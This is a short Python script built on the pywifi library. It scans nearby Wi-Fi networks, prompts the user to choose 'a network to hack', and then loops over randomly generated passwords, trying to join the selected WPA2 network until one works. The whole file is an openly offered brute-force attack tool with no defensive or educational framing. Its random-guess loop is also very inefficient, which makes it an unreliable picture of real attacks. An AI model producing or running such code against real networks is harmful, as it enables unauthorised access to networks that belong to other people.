import pywifi
from pywifi import const
import time
import random
import string

def get_available_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    networks = iface.scan_results()
    return networks

def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))

def try_connect(iface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(3)
    if iface.status() == const.IFACE_CONNECTED:
        print(f"Successfully connected to {ssid} with password: {password}")
        return True
    else:
        print(f"Failed to connect to {ssid} with password: {password}")
        return False

def main():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    networks = get_available_networks()
    print("Available networks:")
    for i, network in enumerate(networks):
        print(f"{i + 1}. {network.ssid}")

    choice = int(input("Choose a network to hack (enter number): ")) - 1
    target_ssid = networks[choice].ssid

    while True:
        password = generate_password()
        print(f"Trying password: {password}")
        if try_connect(iface, target_ssid, password):
            break

if __name__ == "__main__":
    main()
